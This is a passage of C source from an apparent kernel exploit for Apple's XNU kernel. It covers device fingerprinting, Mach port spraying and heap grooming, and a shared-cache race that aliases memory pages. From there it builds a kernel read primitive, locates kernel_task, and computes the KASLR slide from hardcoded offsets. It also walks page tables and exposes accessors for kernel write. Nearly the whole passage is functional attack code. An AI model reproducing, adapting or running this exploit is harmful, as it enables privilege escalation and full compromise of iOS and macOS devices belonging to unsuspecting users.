                uint64_t map_entry_ptr = OC_U64(oc, OC_MAP_ENTRY_PTR);
                uint64_t entry_vm_start = *(uint64_t *)((char *)map_entry_ptr + 16);

                if (recv_count <= 3)
                    klog("[ool] recv %u: entry[2]=0x%llx ool=0x%llx+0x%llx\n",
                            recv_count, (unsigned long long)entry_vm_start,
                            (unsigned long long)ool_addr,
                            (unsigned long long)ool_size);

                if (entry_vm_start >= ool_addr &&
                        entry_vm_start < ool_addr + ool_size) {
                    OC_U64(oc, OC_OOL_BASE) = ool_addr;
                    OC_U64(oc, OC_OOL_SIZE) = ool_size;
                    klog("[ool] OOL MATCH at recv %u addr=0x%llx size=0x%llx\n",
                            recv_count, (unsigned long long)ool_addr,
                            (unsigned long long)ool_size);
                    return 0;
                }

                vm_deallocate(mach_task_self_, ool_addr, ool_size);
                if (!OC_U32(oc, OC_PORT_COUNTS + 4 * recv_idx)) {
                    if (recv_idx == 0) break;
                    recv_idx--;
                }
            }
            klog("[ool] exhausted %u receives, no match\n", recv_count);
        }
        klog("[ool] no OOL mapping matched entry\n");
        return 708625;
next_slot:;
    }
    return 708620;
}

#pragma mark - Context initialization

static void init_inner_context(void) {
    memset(g_inner_ctx, 0, sizeof(g_inner_ctx));

    semaphore_create(mach_task_self_, (semaphore_t *)(g_inner_ctx + IC_SEMAPHORE),
            SYNC_POLICY_FIFO, 0);

    IC_U32(g_inner_ctx, IC_PAGE_ALIGN) = (uint32_t)vm_page_size;
    IC_U64(g_inner_ctx, IC_PAGE_MASK) = vm_page_size - 1;
    IC_U32(g_inner_ctx, IC_KOBJECT_OFF) = 8;
    IC_U32(g_inner_ctx, IC_VALIDATE_OFF) = 2 * (uint32_t)vm_page_size - 64;

    char osrelease[64] = {0};
    size_t len = sizeof(osrelease);
    sysctlbyname("kern.osrelease", osrelease, &len, NULL, 0);

    int major = 0, minor = 0;
    sscanf(osrelease, "%d.%d", &major, &minor);

    uint32_t xnu_ver;
    if (major >= 23) xnu_ver = 10002;
    else if (major >= 22) xnu_ver = 8792;
    else xnu_ver = 8019;
    IC_U32(g_inner_ctx, IC_VERSION) = xnu_ver;

    {
        struct utsname uts;
        uint32_t xnu_major = 10002, xnu_minor = 0, xnu_patch = 0;
        if (uname(&uts) == 0) {
            char *xp = strstr(uts.version, "xnu-");
            if (xp) sscanf(xp, "xnu-%u.%u.%u", &xnu_major, &xnu_minor, &xnu_patch);
        }
        uint64_t inner = ((uint64_t)(xnu_major & 0x7FFF) << 20)
                       | ((uint64_t)(xnu_minor & 0x3FF) << 10)
                       | ((uint64_t)(xnu_patch & 0x3FF));
        IC_U64(g_inner_ctx, IC_KERNEL_VER) = inner << 20;
    }

    uint32_t cpufamily = 0;
    size_t cpufamily_sz = sizeof(cpufamily);
    sysctlbyname("hw.cpufamily", &cpufamily, &cpufamily_sz, NULL, 0);

    uint32_t cpusubfamily = 0;
    size_t cpusubfamily_sz = sizeof(cpusubfamily);
    sysctlbyname("hw.cpusubfamily", &cpusubfamily, &cpusubfamily_sz, NULL, 0);

    int ncpu = get_cpu_count();

    uint64_t kv = IC_U64(g_inner_ctx, IC_KERNEL_VER);

    uint32_t platform_flag = 0;
    int bit5_set = 0;
    int32_t signed_cpufamily = (int32_t)cpufamily;

    switch (signed_cpufamily) {
        case -634136515:
            platform_flag = 0x100000;
            if (ncpu < 8) {
                if (kv > 0x2711FFFFFFFFFFULL) bit5_set = 1;
            } else {
            }
            break;
        case -2023363094:
        case 1598941843:
        case 1912690738:
            platform_flag = 0x1000000;
            if (kv > 0x2711FFFFFFFFFFULL) bit5_set = 1;
            break;
        case -1829029944:
            platform_flag = 0x2000;
            break;
        case 458787763:
            platform_flag = 0x80000;
            break;
        case 1176411346:
            platform_flag = 0x4000;
            break;
        case 678884789:
            platform_flag = 0x4000000;
            bit5_set = 1;
            break;
        case 747742334:
            platform_flag = 0x8000;
            break;
        case 131287967:
            platform_flag = 0x1;
            break;
        case -400654602:
            platform_flag = 0x200;
            break;
        case 1741614739:
            platform_flag = 0x40;
            break;
        case 1463508716:
            platform_flag = 0x80000;
            break;
        default:
            platform_flag = 0;
            break;
    }

    int should_defrag = ((platform_flag & 0x5184001) != 0) && !bit5_set;
    int path_a = (kv > 0x27120080CFFFFFULL) ||
                 (kv >= 0x225C23801AF00EULL && xnu_ver < 10002);

    klog("[kread] === PLATFORM DETECTION ===\n");
    klog("[kread] cpufamily=0x%08x (%d) cpusubfamily=%u ncpu=%d\n",
            cpufamily, signed_cpufamily, cpusubfamily, ncpu);
    klog("[kread] kern_ver=0x%llx xnu=%u\n",
            (unsigned long long)kv, xnu_ver);
    klog("[kread] platform_flag=0x%x bit5=%d\n", platform_flag, bit5_set);
    klog("[kread] path=%s (offsets %d/%d)\n",
            path_a ? "A" : "C", path_a ? 184 : 176, path_a ? 88 : 80);
    klog("[kread] should_defrag=%d (binary condition: flag&0x5184001=%d, !bit5=%d)\n",
            should_defrag,
            (platform_flag & 0x5184001) != 0, !bit5_set);
    if (platform_flag == 0)
        klog("[kread] WARNING: unknown cpufamily - cannot determine platform flags\n");
    klog("[kread] === END PLATFORM DETECTION ===\n");

    IC_U32(g_inner_ctx, 0) = platform_flag | (bit5_set ? 0x20 : 0);

    klog("[kread] inner ctx: page_size=%u page_mask=0x%llx xnu=%u kern=0x%llx os=%s\n",
            IC_U32(g_inner_ctx, IC_PAGE_ALIGN),
            IC_U64(g_inner_ctx, IC_PAGE_MASK),
            xnu_ver,
            IC_U64(g_inner_ctx, IC_KERNEL_VER),
            osrelease);
}

static kern_return_t init_outer_context(void) {
    if (g_outer_ctx) return 0;

    g_outer_ctx = calloc(1, OC_SIZE);
    if (!g_outer_ctx) return KERN_RESOURCE_SHORTAGE;

    OC_U32(g_outer_ctx, OC_MODE) = 3;

    for (int i = 0; i < 16; i++) {
        mach_port_t rp = mach_reply_port();
        if (rp == MACH_PORT_NULL) continue;
        int qlimit = 0x400;
        mach_port_set_attributes(mach_task_self_, rp,
                MACH_PORT_LIMITS_INFO, (mach_port_info_t)&qlimit, 1);
        OC_U32(g_outer_ctx, OC_REPLY_PORTS + 4 * i) = rp;
    }
    klog("[kread] reply ports created\n");

    vm_size_t me_size = vm_page_size;
    mach_port_t me = 0;
    kern_return_t kr = mach_make_memory_entry(mach_task_self_, &me_size,
            0, 0x20000 | VM_PROT_READ | VM_PROT_WRITE | 0x1, &me, 0);
    if (kr) return kr;
    OC_U32(g_outer_ctx, OC_MEM_ENTRY_PORT) = me;

    uint32_t *port_arr = calloc(0x200000, 4);
    if (!port_arr) return KERN_RESOURCE_SHORTAGE;
    OC_U64(g_outer_ctx, OC_PORT_ARRAY) = (uint64_t)port_arr;
    OC_U32(g_outer_ctx, OC_PORT_ARRAY_CNT) = 0x200000;

    vm_address_t vm_region = 0;
    vm_size_t vm_region_size = 129 * vm_page_size;
    kr = vm_map(mach_task_self_, &vm_region, vm_region_size,
            0x1FFFFFF, VM_FLAGS_ANYWHERE | (0xC9 << 24),
            0, 0, 0, VM_PROT_READ | VM_PROT_WRITE,
            VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_COPY);
    if (kr) return kr;
    OC_U64(g_outer_ctx, OC_VM_REGION_BASE) = vm_region;
    OC_U64(g_outer_ctx, OC_VM_REGION_SIZE) = vm_region_size;

    vm_size_t heap_size = vm_page_size * 512;
    vm_address_t heap_buf = 0;
    kr = vm_allocate(mach_task_self_, &heap_buf, heap_size,
            VM_FLAGS_ANYWHERE | (0xCC << 24));
    if (kr) return kr;
    OC_U64(g_outer_ctx, OC_HEAP_BUF) = heap_buf;
    OC_U64(g_outer_ctx, OC_HEAP_SIZE) = heap_size;
    madvise((void *)heap_buf, heap_size, MADV_WILLNEED);
    for (uint64_t j = 0; j < 510; j += 2) {
        int advice = (j & 2) ? MADV_RANDOM : MADV_SEQUENTIAL;
        madvise((void *)(heap_buf + vm_page_size * j),
                vm_page_size * 2, advice);
    }
    klog("[kread] heap buffer: 0x%llx (%llu bytes)\n",
            (unsigned long long)heap_buf, (unsigned long long)heap_size);

    for (int i = 0; i < 256; i++) {
        mach_port_t sp = 0;
        kr = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &sp);
        if (kr) continue;
        int qlimit = 0x400;
        mach_port_set_attributes(mach_task_self_, sp,
                MACH_PORT_LIMITS_INFO, (mach_port_info_t)&qlimit, 1);
        OC_U32(g_outer_ctx, OC_SPRAY_PORTS + 4 * i) = sp;
    }
    klog("[kread] spray ports created\n");

    vm_address_t temp_buf = 0;
    kr = vm_allocate(mach_task_self_, &temp_buf, 0x2000, VM_FLAGS_ANYWHERE);
    if (kr) return kr;
    OC_U64(g_outer_ctx, OC_TEMP_BUF) = temp_buf;
    OC_U64(g_outer_ctx, OC_TEMP_BUF_SIZE) = 0x2000;

    OC_U64(g_outer_ctx, OC_VERSION_FIELD) = 0x10000000800ULL;

    arc4random_buf((void *)((char *)g_outer_ctx + OC_RAND_COOKIE1), 8);
    arc4random_buf((void *)((char *)g_outer_ctx + OC_RAND_COOKIE2), 8);

    klog("[kread] outer ctx initialized (%d bytes)\n", OC_SIZE);
    return 0;
}

void kread_bootstrap_cleanup(void);

#pragma mark - Bootstrap thread wrapper (matches channel_init_dispatch_with_cleanup)

static int g_bootstrap_result;

static int g_kread_established = 0;
int kread_bootstrap_is_established(void) { return g_kread_established; }

static void *bootstrap_thread_fn(void *arg) {
    (void)arg;
    g_bootstrap_result = -99;
    extern int kread_bootstrap_inner(void);
    g_bootstrap_result = kread_bootstrap_inner();
    return NULL;
}

int kread_bootstrap(void) {
    g_kread_log_off = 0;
    g_kread_log[0] = 0;
    klog_open();

    klog("[kread] === KREAD BOOTSTRAP START ===\n");

    klog("[kread] spawning bootstrap thread (fresh pthread)...\n");
    pthread_t bt;
    pthread_attr_t bt_attr;
    pthread_attr_init(&bt_attr);
    pthread_attr_setdetachstate(&bt_attr, PTHREAD_CREATE_JOINABLE);
    if (pthread_create(&bt, &bt_attr, bootstrap_thread_fn, NULL)) {
        pthread_attr_destroy(&bt_attr);
        klog("[kread] failed to create bootstrap thread\n");
        return -10;
    }
    pthread_join(bt, NULL);
    pthread_attr_destroy(&bt_attr);
    klog("[kread] bootstrap thread completed: %d\n", g_bootstrap_result);
    if (g_bootstrap_result == 0) g_kread_established = 1;
    return g_bootstrap_result;
}

int kread_bootstrap_inner(void) {
    klog_open();
    klog("[kread] running in fresh pthread (tid=%p)\n", (void *)pthread_self());

    {
        task_exc_guard_behavior_t guard_behavior = 0;
        kern_return_t gkr = task_get_exc_guard_behavior(mach_task_self_,
                &guard_behavior);
        if (gkr == KERN_SUCCESS && (guard_behavior & 0x88)) {
            kern_return_t skr = task_set_exc_guard_behavior(mach_task_self_,
                    guard_behavior & 0xFFFFFF77);
            klog("[kread] exc_guard: 0x%x -> 0x%x (kr=0x%x)\n",
                    guard_behavior, guard_behavior & 0xFFFFFF77, skr);
        } else {
            klog("[kread] exc_guard: 0x%x (no change, kr=0x%x)\n",
                    guard_behavior, gkr);
        }
    }

    {
        struct utsname uts;
        if (uname(&uts) == 0) {
            klog("[kread] uname.version: %.200s\n", uts.version);
            klog("[kread] uname.release: %s machine: %s\n", uts.release, uts.machine);
        }
    }

    klog("[kread] step1: init_inner_context...\n");
    init_inner_context();
    klog("[kread] step1: init_outer_context...\n");
    kern_return_t kr = init_outer_context();
    if (kr) {
        klog("[kread] outer ctx init failed: 0x%x\n", kr);
        return -1;
    }
    klog("[kread] step1: contexts initialized OK\n");

    uint64_t kern_ver = IC_U64(g_inner_ctx, IC_KERNEL_VER);
    int path_c = (kern_ver <= 0x27120F04B00002ULL) &&
                 !(kern_ver > 0x27120080CFFFFFULL);
    klog("[kread] kern_ver=0x%llx path=%s\n",
            (unsigned long long)kern_ver,
            path_c ? "C (176/80)" : "A (184/88)");

    uint32_t ctx0 = IC_U32(g_inner_ctx, 0);
    int do_defrag = ((ctx0 & 0x5184001) != 0) && ((ctx0 & 0x20) == 0);
    klog("[kread] step2: ctx[0]=0x%x defrag=%s\n", ctx0, do_defrag ? "YES" : "SKIP");
    if (do_defrag) {
        vm_address_t defrag_addrs[32];
        memset(defrag_addrs, 0, sizeof(defrag_addrs));
        int defrag_count = 0;
        for (int i = 0; i < 32; i++) {
            vm_address_t addr = 0;
            kr = vm_map(mach_task_self_, &addr, 0x2000000, 0x1FFFFFF,
                    VM_FLAGS_ANYWHERE | 0x8 | (0xC8 << 24),
                    0, 0, 0, VM_PROT_READ | VM_PROT_WRITE,
                    VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_COPY);
            if (kr == 3) continue;
            if (kr) break;
            madvise((void *)addr, vm_page_size, MADV_WILLNEED);
            defrag_addrs[defrag_count++] = addr;
        }
        for (int i = 0; i < defrag_count; i++) {
            if (defrag_addrs[i])
                vm_deallocate(mach_task_self_, defrag_addrs[i], 0x2000000);
        }
        klog("[kread] step2: defrag done (%d regions)\n", defrag_count);
    }

    uint64_t vm_base = OC_U64(g_outer_ctx, OC_VM_REGION_BASE);
    uint64_t vm_size = OC_U64(g_outer_ctx, OC_VM_REGION_SIZE);
    if (vm_base && vm_size) {
        madvise((void *)(vm_base + vm_size - vm_page_size),
                vm_page_size, MADV_WILLNEED);
    }

    {
        find_submap_region(g_outer_ctx, 16);
        uint64_t sb = OC_U64(g_outer_ctx, OC_SUBMAP_BASE);
        uint64_t ss = OC_U64(g_outer_ctx, OC_SUBMAP_SIZE);
        klog("[kread] submap verify: base=0x%llx size=0x%llx\n",
                (unsigned long long)sb, (unsigned long long)ss);
        if (sb && ss) {
            mach_port_t ve = 0;
            memory_object_size_t vsz = ss;
            kern_return_t vkr = mach_make_memory_entry_64(mach_task_self_,
                    &vsz, sb, VM_PROT_READ, &ve, 0);
            klog("[kread] entry test: kr=0x%x port=0x%x sz=0x%llx\n",
                    vkr, ve, (unsigned long long)vsz);
            if (vkr == 0) {
                uint64_t oid = get_obj_id_full(sb);
                klog("[kread] submap obj_id=0x%llx\n",
                        (unsigned long long)oid);
                vm_address_t taddr = 0;
                kern_return_t tkr = vm_map(mach_task_self_, &taddr, ss, 0,
                        VM_FLAGS_ANYWHERE, ve, 0, FALSE,
                        VM_PROT_READ, VM_PROT_READ, VM_INHERIT_COPY);
                if (tkr == 0) {
                    uint64_t remap_oid = get_obj_id_full(taddr);
                    klog("[kread] mapped obj_id=0x%llx (same=%d)\n",
                            (unsigned long long)remap_oid, remap_oid == oid);
                    vm_deallocate(mach_task_self_, taddr, ss);
                }
                mach_port_deallocate(mach_task_self_, ve);
            }
        }
    }

    klog("[kread] starting race loop (16 slots)...\n");
    int race_won = -1;
    for (int slot = 0; slot < RACE_SLOT_COUNT; slot++) {
        if (OC_U32(g_outer_ctx, OC_MODE) != 3) {
            klog("[kread] mode check failed (mode=%d)\n",
                    OC_U32(g_outer_ctx, OC_MODE));
            return -2;
        }

        uint8_t *race_out = (uint8_t *)g_outer_ctx +
                RACE_SLOT_SIZE * slot + RACE_OUT_OFF;

        klog("[kread] slot %d: racing...\n", slot);
        kr = shared_cache_race(g_inner_ctx, g_outer_ctx, 16, race_out);
        klog("[kread] slot %d: race returned 0x%x\n", slot, kr);
        if (kr) {
            klog("[kread] slot %d: race failed 0x%x\n", slot, kr);
            continue;
        }

        klog("[kread] slot %d: race SUCCESS, base=0x%llx size=0x%llx pages=%u\n",
                slot,
                (unsigned long long)RO_U64(race_out, RO_BASE),
                (unsigned long long)RO_U64(race_out, RO_VM_SIZE),
                RO_U32(race_out, RO_PAGE_COUNT));
        klog("[kread] slot %d: detecting aliases...\n", slot);
        kr = detect_aliased_pages(g_outer_ctx, race_out);
        if (kr) {
            klog("[kread] slot %d: alias detect failed 0x%x\n", slot, kr);
            continue;
        }

        klog("[kread] slot %d: ALIAS DETECTED, grooming...\n", slot);

        kr = groom_and_scan(g_inner_ctx, g_outer_ctx, race_out, slot);
        if (kr == 0) {
            klog("[kread] slot %d: kernel structure found\n", slot);
            race_won = slot;
            OC_U32(g_outer_ctx, OC_RACE_SLOT) = slot;
            break;
        }
        klog("[kread] slot %d: groom/scan result=0x%x\n", slot, kr);
    }

    if (race_won < 0) {
        klog("[kread] FAILED: no kernel structure found in 16 slots\n");
        return -3;
    }

    klog("[kread] finding OOL mapping...\n");
    kr = find_ool_mapping(g_inner_ctx, g_outer_ctx, race_won);
    if (kr) {
        klog("[kread] OOL mapping failed: 0x%x\n", kr);

        if (!OC_U64(g_outer_ctx, OC_MAP_ENTRY_PTR)) {
            klog("[kread] no map entry pointer - cannot proceed\n");
            return -4;
        }
    }

    IC_U64(g_inner_ctx, IC_OUTER_CTX) = (uint64_t)g_outer_ctx;
    IC_U64(g_inner_ctx, IC_KREAD_FN) = (uint64_t)kread_via_vmregion;

    uint64_t kptr = OC_U64(g_outer_ctx, OC_KPTR);
    klog("[kread] === KREAD BOOTSTRAP COMPLETE ===\n");
    klog("[kread] kptr = 0x%llx\n", (unsigned long long)kptr);
    klog("[kread] map_entry = 0x%llx\n",
            OC_U64(g_outer_ctx, OC_MAP_ENTRY_PTR));
    klog("[kread] map_hdr = 0x%llx\n",
            OC_U64(g_outer_ctx, OC_MAP_HDR_PTR));

    if (OC_U64(g_outer_ctx, OC_MAP_ENTRY_PTR) && kptr) {
        uint64_t test_val = 0;
        kr = kread_via_vmregion(g_inner_ctx, kptr, (uint8_t *)&test_val, 8, 1);
        if (kr == 0) {
            klog("[kread] TEST READ: kread64(0x%llx) = 0x%llx\n",
                    (unsigned long long)kptr, (unsigned long long)test_val);
        } else {
            klog("[kread] TEST READ failed: 0x%x\n", kr);
            return kr;
        }
    }

    {
        uint64_t kern_task = 0;
        uint64_t cur_proc = kptr;
        for (int steps = 0; steps < 200; steps++) {
            uint64_t next = 0;
            if (kread64(cur_proc + 48, &next)) break;
            if (!validate_kptr(g_inner_ctx, next) || next == kptr) break;
            uint64_t pid_val = 0;
            kread64(next - 1744, &pid_val);
            if ((int)(uint32_t)pid_val == 0) {
                kern_task = next - 1840;
                break;
            }
            cur_proc = next;
        }
        if (!kern_task) {
            klog("[kread] kernel_task not found\n");
            return 0;
        }

        uint64_t kc_base = kern_task - 0x32997D0;
        uint64_t slide = kc_base - 0xFFFFFFF027004000ULL;
        klog("[kread] KASLR slide = 0x%llx\n", (unsigned long long)slide);

        uint64_t count_ptr = 0, seg_table_ptr = 0;
        kread64(kc_base + 0x8FC658ULL, &count_ptr);
        kread64(kc_base + 0x8FC660ULL, &seg_table_ptr);
        uint64_t seg_count = 0;
        if (validate_kptr(g_inner_ctx, count_ptr))
            kread64(count_ptr, &seg_count);
        seg_count &= 0xFFFFFFFF;

        if (seg_count && seg_count <= 32 && validate_kptr(g_inner_ctx, seg_table_ptr)) {
            IC_U64(g_inner_ctx, 1488) = slide;
            IC_U64(g_inner_ctx, 1496) = seg_count;
            IC_U64(g_inner_ctx, 1504) = seg_table_ptr;

            uint64_t test_pa = kva_to_pa(kern_task);
            if (test_pa) {
                klog("[kread] VA<->PA OK: kern_task 0x%llx -> PA 0x%llx\n",
                        (unsigned long long)kern_task, (unsigned long long)test_pa);
            } else {
                klog("[kread] VA<->PA: translation failed for kern_task\n");
            }
        } else {
            klog("[kread] VA<->PA: segment table unavailable\n");
        }
    }

    pte_walk_init();

    {
        uint64_t sc = IC_U64(g_inner_ctx, 1496);
        uint64_t st = IC_U64(g_inner_ctx, 1504);
        if (sc && sc <= 32 && st) {
            klog("[kread] segment table (%llu entries):\n", (unsigned long long)sc);
            for (uint64_t si = 0; si < sc; si++) {
                uint64_t sp = 0, sv = 0, sr = 0;
                kread64(st + si * 24, &sp);
                kread64(st + si * 24 + 8, &sv);
                kread64(st + si * 24 + 16, &sr);
                klog("[kread]   [%llu] phys=0x%llx virt=0x%llx size=0x%llx\n",
                        (unsigned long long)si, (unsigned long long)sp,
                        (unsigned long long)sv, (unsigned long long)(sr << 14));
            }
            if (g_tte_pa)
                klog("[kread] tte_pa=0x%llx tte_va=0x%llx\n",
                        (unsigned long long)g_tte_pa, (unsigned long long)g_tte_va);
        }
    }

    return 0;
}

void kread_bootstrap_cleanup(void) {
    g_kread_established = 0;
    if (!g_outer_ctx) {
        memset(g_inner_ctx, 0, sizeof(g_inner_ctx));
        return;
    }
    uint8_t *oc = g_outer_ctx;

    for (int i = 0; i < 256; i++) {
        mach_port_t sp = OC_U32(oc, OC_SPRAY_PORTS + 4 * i);
        if (!sp) continue;
        uint32_t cnt = OC_U32(oc, OC_PORT_COUNTS + 4 * i);
        for (uint32_t j = 0; j < cnt; j++) {
            uint8_t buf[64];
            memset(buf, 0, sizeof(buf));
            mach_msg_header_t *hdr = (mach_msg_header_t *)buf;
            kern_return_t kr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                    0, sizeof(buf), sp, 0, 0);
            if (kr) break;
            mach_msg_destroy(hdr);
        }
        OC_U32(oc, OC_PORT_COUNTS + 4 * i) = 0;
    }

    uint32_t extra_cnt = OC_U32(oc, OC_EXTRA_PORT_CNT);
    for (uint32_t i = 0; i < extra_cnt; i++) {
        mach_port_t ep = OC_U32(oc, OC_EXTRA_PORTS + 4 * i);
        if (ep) mach_port_deallocate(mach_task_self_, ep);
    }
    OC_U32(oc, OC_EXTRA_PORT_CNT) = 0;

    uint32_t alloc_idx = OC_U32(oc, OC_ALLOC_IDX);
    for (uint32_t i = 0; i < alloc_idx && i < 0x400; i++) {
        mach_port_t ae = OC_U32(oc, OC_ALLOC_ENTRIES + 4 * i);
        if (ae) {
            mach_port_deallocate(mach_task_self_, ae);
            OC_U32(oc, OC_ALLOC_ENTRIES + 4 * i) = 0;
        }
        uint64_t ap = *(uint64_t *)((char *)oc + OC_ALLOC_PAGES + 8 * i);
        if (ap) {
            vm_deallocate(mach_task_self_, (vm_address_t)ap, vm_page_size);
            *(uint64_t *)((char *)oc + OC_ALLOC_PAGES + 8 * i) = 0;
        }
    }
    OC_U32(oc, OC_ALLOC_IDX) = 0;

    uint32_t *port_arr = (uint32_t *)OC_U64(oc, OC_PORT_ARRAY);
    if (port_arr) {
        uint32_t cnt = OC_U32(oc, OC_PORT_ARRAY_CNT);
        for (uint32_t i = 0; i < cnt; i++) {
            if (port_arr[i]) {
                mach_port_deallocate(mach_task_self_, port_arr[i]);
                port_arr[i] = 0;
            }
        }
        free(port_arr);
        OC_U64(oc, OC_PORT_ARRAY) = 0;
    }

    uint64_t temp = OC_U64(oc, OC_TEMP_BUF);
    if (temp) {
        vm_deallocate(mach_task_self_, temp, OC_U64(oc, OC_TEMP_BUF_SIZE));
        OC_U64(oc, OC_TEMP_BUF) = 0;
    }

    for (int i = 0; i < 16; i++) {
        mach_port_t rp = OC_U32(oc, OC_REPLY_PORTS + 4 * i);
        if (rp) {
            mach_port_deallocate(mach_task_self_, rp);
            OC_U32(oc, OC_REPLY_PORTS + 4 * i) = 0;
        }
    }
    for (int i = 0; i < 256; i++) {
        mach_port_t sp = OC_U32(oc, OC_SPRAY_PORTS + 4 * i);
        if (sp) {
            mach_port_mod_refs(mach_task_self_, sp,
                    MACH_PORT_RIGHT_RECEIVE, -1);
            OC_U32(oc, OC_SPRAY_PORTS + 4 * i) = 0;
        }
    }

    memset(g_inner_ctx, 0, sizeof(g_inner_ctx));
}
#pragma mark - Accessors for kernel_primitives

uint8_t *kwrite_get_groom_elem(void) {
    if (!g_outer_ctx) return NULL;
    return (uint8_t *)(uintptr_t)OC_U64(g_outer_ctx, OC_ALIASED_PAGE);
}

uint32_t kwrite_get_mem_entry_port(void) {
    if (!g_outer_ctx) return 0;
    return OC_U32(g_outer_ctx, OC_FOUND_MEM_ENTRY);
}

uint64_t kwrite_get_page_mask(void) {
    return IC_U64(g_inner_ctx, IC_PAGE_MASK);
}

kern_return_t kwrite_kread64(uint64_t kaddr, uint64_t *out) {
    return kread64(kaddr, out);
}

kern_return_t kwrite_kread32(uint64_t kaddr, uint32_t *out) {
    return kread32(kaddr, out);
}

uint64_t kwrite_get_found_kptr_base(void) {
    if (!g_outer_ctx) return 0;
    return OC_U64(g_outer_ctx, OC_FOUND_KPTR_BASE);
}

uint64_t kwrite_get_kern_task_kva(void) {
    uint64_t slide = IC_U64(g_inner_ctx, 1488);
    if (!slide) return 0;
    return 0xFFFFFFF027004000ULL + slide + 0x32997D0;
}

uint64_t kwrite_get_kaslr_slide(void) {
    return IC_U64(g_inner_ctx, 1488);
}

int kread_walk_pte(uint64_t kva, uint64_t *out_pte_kva,
        uint64_t *out_pte_value, int *out_level) {
    *out_pte_kva = 0;
    *out_pte_value = 0;
    *out_level = 0;

    if (!pte_walk_init()) return 0;

    uint64_t tte_readable = pa_to_kva(g_tte_pa);
    if (!tte_readable) return 0;

    uint64_t l0_addr = tte_readable + 8 * ((kva >> 36) & 7);
    uint64_t l0_pte = 0;
    if (kread64(l0_addr, &l0_pte) || !(l0_pte & 3)) return 0;

    uint64_t l1_pa = l0_pte & 0xFFFFFFFFC000ULL;
    uint64_t l1_va = pa_to_kva(l1_pa);
    if (!l1_va) return 0;
    uint64_t l1_addr = l1_va + ((kva >> 22) & 0x3FF8);
    uint64_t l1_pte = 0;
    if (kread64(l1_addr, &l1_pte) || !(l1_pte & 3)) return 0;
    if ((l1_pte & 3) == 1) {
        *out_pte_kva = l1_addr;
        *out_pte_value = l1_pte;
        *out_level = 1;
        return 1;
    }

    uint64_t l2_pa = l1_pte & 0xFFFFFFFFC000ULL;
    uint64_t l2_va = pa_to_kva(l2_pa);
    if (!l2_va) return 0;
    uint64_t l2_addr = l2_va + ((kva >> 11) & 0x3FF8);
    uint64_t l2_pte = 0;
    if (kread64(l2_addr, &l2_pte)) return 0;
    if ((~l2_pte & 3) != 0) return 0;

    *out_pte_kva = l2_addr;
    *out_pte_value = l2_pte;
    *out_level = (int)(l2_pte & 3);
    return 1;
}

uint64_t kread_get_our_proc(void) {
    if (!g_outer_ctx) return 0;
    return OC_U64(g_outer_ctx, OC_KPTR);
}

void kread_get_seg(int idx, uint64_t *phys, uint64_t *virt, uint64_t *size) {
    *phys = *virt = *size = 0;
    if (idx >= 0 && idx < g_cached_seg_count) {
        *phys = g_cached_segs[idx].phys;
        *virt = g_cached_segs[idx].virt;
        *size = g_cached_segs[idx].size;
    }
}
